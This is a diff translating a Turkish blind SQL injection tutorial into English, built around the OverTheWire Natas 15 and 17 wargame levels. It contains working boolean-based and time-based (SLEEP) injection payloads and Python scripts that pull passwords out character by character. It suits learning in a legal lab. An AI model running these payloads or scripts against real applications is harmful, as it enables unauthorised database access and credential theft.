@@ -1,145 +1,145 @@
-# 🌐 Web Güvenliği — Blind SQL Injection
+# 🌐 Web Security — Blind SQL Injection
 
-> Sunucu sana hata mesajı göstermiyor, sadece "var" veya "yok" diyor.
-> Bu yeterli — tek bit bilgiyle, yeterli soruyla her şeyi öğrenebilirsin.
+> The server doesn't show you an error message, it only says "exists" or "doesn't exist."
+> That's enough — with a single bit of information and enough questions, you can learn everything.
 
 ---
 
-## 📋 İçindekiler
+## 📋 Table of Contents
 
-- [Blind SQLi Nedir?](#blind-sqli-nedir)
+- [What Is Blind SQLi?](#what-is-blind-sqli)
 - [Boolean-Based Blind SQLi](#boolean-based-blind-sqli)
-- [Karakter Karakter Şifre Çıkarma](#karakter-karakter-şifre-çıkarma)
+- [Extracting the Password Character by Character](#extracting-the-password-character-by-character)
 - [Time-Based Blind SQLi](#time-based-blind-sqli)
-- [Binary Search ile Hızlandırma](#binary-search-ile-hızlandırma)
-- [Python ile Otomatize Etme](#python-ile-otomatize-etme)
-- [Natas'ta Kullanım](#natasta-kullanım)
+- [Speeding Up with Binary Search](#speeding-up-with-binary-search)
+- [Automating with Python](#automating-with-python)
+- [Usage in Natas](#usage-in-natas)
 
 ---
 
-## Blind SQLi Nedir?
+## What Is Blind SQLi?
 
-Normal SQLi'da uygulama sorgu sonucunu doğrudan ekranda gösterir. Blind SQLi'da ise uygulama:
+In normal SQLi, the application shows the query result directly on the screen. In Blind SQLi, however, the application:
 
-- Hata mesajı **göstermez**
-- Sorgu sonucunu **ekrana yazmaz**
-- Sadece "kullanıcı var / yok" veya "doğru / yanlış" gibi **iki farklı durum** gösterir
+- Does **not** show an error message
+- Does **not** print the query result to the screen
+- Only shows **two different states** like "user exists / doesn't exist" or "true / false"
 
 ```
 Normal SQLi:
   SELECT password FROM users WHERE id=1
-  → "abc123" (şifreyi doğrudan görürsün)
+  → "abc123" (you see the password directly)
 
 Blind SQLi:
-  Kullanıcı mevcut mu?  → "Bu kullanıcı var" / "Bu kullanıcı yok"
-  Sadece true/false bilgisi
+  Does the user exist?  → "This user exists" / "This user doesn't exist"
+  Only true/false information
 ```
 
-Bu iki durum arasındaki fark, sormak istediğimiz soruları oluşturur.
+The difference between these two states forms the questions we want to ask.
 
 ---
 
 ## Boolean-Based Blind SQLi
 
-Sorgunun `true` veya `false` döndürmesini kontrol ederek bilgi çıkarırız.
+We extract information by checking whether the query returns `true` or `false`.
 
-### Temel Mantık
+### Basic Logic
 
 ```sql
--- "natas15 kullanıcısı var mı?" → true/false
+-- "Does the user natas15 exist?" → true/false
 SELECT * FROM users WHERE username='natas15'
 
--- "natas15 kullanıcısının şifresi 'a' harfiyle başlıyor mu?" → true/false
+-- "Does the password of natas15 start with the letter 'a'?" → true/false
 SELECT * FROM users WHERE username='natas15' AND password LIKE 'a%'
 
--- "Şifrenin 1. karakteri 'W' mi?"
+-- "Is the 1st character of the password 'W'?"
 SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'W%'
 ```
 
-Her soru bir bit bilgi verir. Yeterli soruyla tam şifreyi öğrenebiliriz.
+Each question gives one bit of information. With enough questions we can learn the full password.
 
-### LIKE Operatörü
-
-```sql
-LIKE 'a%'        → 'a' ile başlayan
-LIKE '%a%'       → içinde 'a' olan
-LIKE 'a_'        → 'a' + herhangi bir karakter (tam 2 karakter)
-LIKE 'abc%'      → 'abc' ile başlayan
-```
-
-`%` → sıfır veya daha fazla karakter
-`_` → tam bir karakter
-
-### BINARY — Büyük/Küçük Harf Duyarlı
-
-MySQL'de LIKE büyük/küçük harfe duyarsızdır:
+### The LIKE Operator
 
 ```sql
-password LIKE 'W%'    → 'W' veya 'w' ile başlayan (ikisi de eşleşir)
-BINARY password LIKE 'W%'   → sadece büyük 'W' ile başlayan
+LIKE 'a%'        → starts with 'a'
+LIKE '%a%'       → contains 'a'
+LIKE 'a_'        → 'a' + any character (exactly 2 characters)
+LIKE 'abc%'      → starts with 'abc'
 ```
 
-Şifreleri çıkarırken `BINARY` kullanmak daha doğru sonuç verir.
+`%` → zero or more characters
+`_` → exactly one character
+
+### BINARY — Case-Sensitive
+
+In MySQL, LIKE is case-insensitive:
+
+```sql
+password LIKE 'W%'    → starts with 'W' or 'w' (both match)
+BINARY password LIKE 'W%'   → only starts with uppercase 'W'
+```
+
+When extracting passwords, using `BINARY` gives more accurate results.
 
 ---
 
-## Karakter Karakter Şifre Çıkarma
+## Extracting the Password Character by Character
 
-### Yöntem 1: LIKE ile Prefix Testi
+### Method 1: Prefix Test with LIKE
 
-Her pozisyon için tüm karakterleri dene:
+For each position, try all characters:
 
 ```sql
--- 1. karakter 'a' mı?
+-- Is the 1st character 'a'?
 SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'a%'
 
--- 1. karakter 'b' mi?
+-- Is the 1st character 'b'?
 SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'b%'
 
--- 1. karakter 'W' mi? → TRUE → devam et
+-- Is the 1st character 'W'? → TRUE → continue
 SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'W%'
 
--- 2. karakter 'a' mı?
+-- Is the 2nd character 'a'?
 SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'Wa%'
 ...
 ```
 
-Her karakter için: küçük harfler (26) + büyük harfler (26) + rakamlar (10) = 62 deneme.
+For each character: lowercase letters (26) + uppercase letters (26) + digits (10) = 62 attempts.
 
-32 karakterlik şifre için → 32 × 62 = ~2000 istek. Yavaş ama çalışır.
+For a 32-character password → 32 × 62 = ~2000 requests. Slow but it works.
 
-### Yöntem 2: SUBSTRING + Eşitlik
+### Method 2: SUBSTRING + Equality
 
 ```sql
--- Şifrenin 1. karakteri 'W' mi?
+-- Is the 1st character of the password 'W'?
 SELECT * FROM users WHERE username='natas15' 
   AND SUBSTRING(password, 1, 1) = 'W'
 
--- Şifrenin 2. karakteri 'A' mi?
+-- Is the 2nd character of the password 'A'?
 SELECT * FROM users WHERE username='natas15' 
   AND SUBSTRING(password, 1, 2) = 'WA'
 ```
 
-`SUBSTRING(str, başlangıç, uzunluk)` — 1-indexed.
+`SUBSTRING(str, start, length)` — 1-indexed.
 
-### Yöntem 3: ASCII + Sayısal Karşılaştırma
+### Method 3: ASCII + Numeric Comparison
 
 ```sql
--- 1. karakterin ASCII değeri 87'den büyük mü? (87 = 'W')
+-- Is the ASCII value of the 1st character greater than 87? (87 = 'W')
 SELECT * FROM users WHERE username='natas15'
   AND ASCII(SUBSTRING(password, 1, 1)) > 87
 ```
 
-Bu yöntem binary search ile birleşince çok hızlıdır.
+This method is very fast when combined with binary search.
 
 ---
 
 ## Time-Based Blind SQLi
 
-Bazen uygulama true/false için görsel fark bile oluşturmuyor. Bu durumda `SLEEP()` fonksiyonu kullanılır.
+Sometimes the application doesn't even create a visual difference for true/false. In this case the `SLEEP()` function is used.
 
 ```sql
--- Eğer koşul doğruysa 5 saniye bekle, yanlışsa beklemeden döner
+-- If the condition is true, wait 5 seconds; if false, return without waiting
 SELECT * FROM users WHERE username='natas17' 
   AND IF(BINARY password LIKE 'W%', SLEEP(5), 1)
 ```
@@ -148,32 +148,32 @@ SELECT * FROM users WHERE username='natas17'
 import time, requests
 
 start = time.time()
-# İstek gönder
+# Send the request
 elapsed = time.time() - start
 
-if elapsed > 4:   # 5 saniye bekledi → koşul TRUE
-    print("Bu karakter doğru!")
+if elapsed > 4:   # waited 5 seconds → condition TRUE
+    print("This character is correct!")
 ```
 
-Natas 17 için bu yöntem gereklidir — ekranda hiçbir şey gösterilmez.
+For Natas 17 this method is required — nothing is shown on the screen.
 
 ---
 
-## Binary Search ile Hızlandırma
+## Speeding Up with Binary Search
 
-Her karakter için 62 deneme yerine binary search kullanırsak ~6 denemede bulabiliriz.
+If we use binary search instead of 62 attempts per character, we can find it in ~6 attempts.
 
-### Mantık
+### The Logic
 
 ```
-Karakter ASCII değeri 32-127 arasında
-Orta nokta: 79
+The character's ASCII value is between 32-127
+Midpoint: 79
 
-ASCII değeri > 79 mu?
-  Evet → [80-127] arasında ara
-  Hayır → [32-79] arasında ara
+Is the ASCII value > 79?
+  Yes → search in [80-127]
+  No  → search in [32-79]
 
-Her adımda aralığı yarıya indir
+At each step, halve the range
 ```
 
 ```python
@@ -183,14 +183,14 @@ def find_char(position, session, url, username, password):
     while low <= high:
         mid = (low + high) // 2
 
-        # ASCII değeri mid'den büyük mü?
+        # Is the ASCII value greater than mid?
         payload = f"natas15' AND ASCII(SUBSTRING(password,{position},1))>{mid}-- "
         r = session.post(url, data={'username': payload}, auth=(username, password))
 
         if "This user exists" in r.text:
             low = mid + 1
         else:
-            # Tam eşit mi kontrol et
+            # Check whether it's exactly equal
             payload_eq = f"natas15' AND ASCII(SUBSTRING(password,{position},1))={mid}-- "
             r2 = session.post(url, data={'username': payload_eq}, auth=(username, password))
             if "This user exists" in r2.text:
@@ -203,7 +203,7 @@ def find_char(position, session, url, username, password):
 
 ---
 
-## Python ile Otomatize Etme
+## Automating with Python
 
 ### Natas 15 — Boolean-Based (LIKE)
 
@@ -213,7 +213,7 @@ import string
 
 url      = "http://natas15.natas.labs.overthewire.org/"
 username = "natas15"
-password = "[natas15_şifresi]"
+password = "[natas15_password]"
 
 chars    = string.ascii_letters + string.digits   # a-z + A-Z + 0-9
 found    = ""
@@ -230,14 +230,14 @@ while True:
         )
         if "This user exists" in r.text:
             found += c
-            print(f"[+] Bulunan: {found}")
+            print(f"[+] Found: {found}")
             found_next = True
             break
 
     if not found_next:
-        break   # şifrenin sonuna ulaştık
+        break   # we reached the end of the password
 
-print(f"\n[✓] Şifre: {found}")
+print(f"\n[✓] Password: {found}")
 ```
 
 ### Natas 17 — Time-Based (SLEEP)
@@ -247,12 +247,12 @@ import requests, time, string
 
 url      = "http://natas17.natas.labs.overthewire.org/"
 username = "natas17"
-password = "[natas17_şifresi]"
+password = "[natas17_password]"
 
 chars  = string.ascii_letters + string.digits
 found  = ""
 
-for position in range(1, 33):   # 32 karakterlik şifre
+for position in range(1, 33):   # 32-character password
     for c in chars:
         payload = (
             f'natas18" AND IF(BINARY password LIKE "{found + c}%",'
@@ -264,17 +264,17 @@ for position in range(1, 33):   # 32 karakterlik şifre
 
         if elapsed >= 1:
             found += c
-            print(f"[+] Pozisyon {position}: {c} | Şimdiye kadar: {found}")
+            print(f"[+] Position {position}: {c} | So far: {found}")
             break
 ```
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 15 — Kullanıcı Var/Yok Blind SQLi
+### Natas 15 — User Exists/Doesn't Exist Blind SQLi
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
@@ -290,27 +290,27 @@ if($res) {
 ?>
 ```
 
-**İki durum:**
-- `"This user exists."` → sorgu TRUE
-- `"This user doesn't exist."` → sorgu FALSE
+**Two states:**
+- `"This user exists."` → query TRUE
+- `"This user doesn't exist."` → query FALSE
 
-**Manuel test:**
+**Manual test:**
 
 ```
 Username: natas16" AND BINARY password LIKE "W%"-- 
-→ "This user exists." → şifre W ile başlıyor!
+→ "This user exists." → the password starts with W!
 
 Username: natas16" AND BINARY password LIKE "WA%"-- 
-→ "This user exists." → ikinci karakter A!
+→ "This user exists." → the second character is A!
 ```
 
-**Otomatik Python scriptiyle:** yukarıdaki kodu çalıştır → tüm şifreyi bulur.
+**With the automated Python script:** run the code above → it finds the full password.
 
 ---
 
 ### Natas 17 — SLEEP Blind SQLi
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
@@ -318,38 +318,38 @@ $query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
 $res = mysql_query($query, $link);
 if($res) {
     if(mysql_num_rows($res) > 0) {
-        // HİÇBİR ŞEY YAZMAZ — görsel fark yok!
+        // WRITES NOTHING — no visual difference!
     }
 }
 ?>
 ```
 
-Ekranda hiçbir fark yok. Time-based yöntem zorunlu.
+There's no difference on the screen. The time-based method is mandatory.
 
 ---
 
-### Blind SQLi — Kontrol Listesi
+### Blind SQLi — Checklist
 
 ```
-Tespit:
-  ☐ Normal SQLi hata mesajı veriyor mu? (Hayır → Blind olabilir)
-  ☐ İki farklı durum var mı? (var/yok, doğru/yanlış, hızlı/yavaş)
-  ☐ ' OR 1=1-- ile ' OR 1=2-- farklı sonuç veriyor mu?
+Detection:
+  ☐ Does normal SQLi give an error message? (No → could be Blind)
+  ☐ Are there two different states? (exists/doesn't exist, true/false, fast/slow)
+  ☐ Do ' OR 1=1-- and ' OR 1=2-- give different results?
 
-Yöntem seç:
-  ☐ Görsel fark var mı? → Boolean-based
-  ☐ Görsel fark yok mu? → Time-based (SLEEP)
+Choose a method:
+  ☐ Is there a visual difference? → Boolean-based
+  ☐ Is there no visual difference? → Time-based (SLEEP)
 
-Otomatize et:
-  ☐ requests kütüphanesi ile Python script yaz
-  ☐ Karakter seti belirle: string.ascii_letters + string.digits
-  ☐ LIKE ile prefix testi veya binary search kullan
-  ☐ BINARY kullan (büyük/küçük harf duyarlı)
+Automate:
+  ☐ Write a Python script with the requests library
+  ☐ Determine the character set: string.ascii_letters + string.digits
+  ☐ Use a prefix test with LIKE or binary search
+  ☐ Use BINARY (case-sensitive)
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
 - [PortSwigger — SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
@@ -357,7 +357,7 @@ Otomatize et:
 
 ---
 
-**Önceki konu:** [11_sql_injection.md](./11_sql_injection.md)
-**Sonraki konu:** [13_command_injection_ileri.md](./13_command_injection_ileri.md)
+**Previous topic:** [11_sql_injection.md](./11_sql_injection.md)
+**Next topic:** [13_command_injection_advanced.md](./13_command_injection_advanced.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
